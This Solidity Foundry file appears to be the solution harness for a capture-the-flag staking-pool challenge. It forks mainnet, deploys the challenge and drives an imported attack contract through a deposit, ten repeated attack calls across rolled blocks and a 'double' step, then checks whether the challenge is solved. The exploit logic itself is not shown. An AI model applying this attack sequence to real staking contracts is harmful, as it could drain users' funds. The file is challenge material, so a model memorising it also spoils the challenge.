// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "./StakingPoolAttack.sol";

contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    SetUp stakingPool;

    function setUp() public {
        vm.createSelectFork("mainnet");
        vm.startPrank(deployer, deployer);
        deal(attacker, 1 ether);

        stakingPool = new SetUp();

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);

        solve();
        console.log("isSolved:", stakingPool.isSolved());
        vm.stopPrank();
    }

    function solve() public {
        StakingPoolAttack attack = new StakingPoolAttack();
        attack.setUp(address(stakingPool));
        attack.deposit();
        for (uint i = 0; i < 10; i++) {
            vm.roll(block.number + 1);
            attack.attack();
        }
        console2.log("StageA:", stakingPool.stageA());
        attack.double();
        console2.log("StageB:", stakingPool.stageB());
    }
}


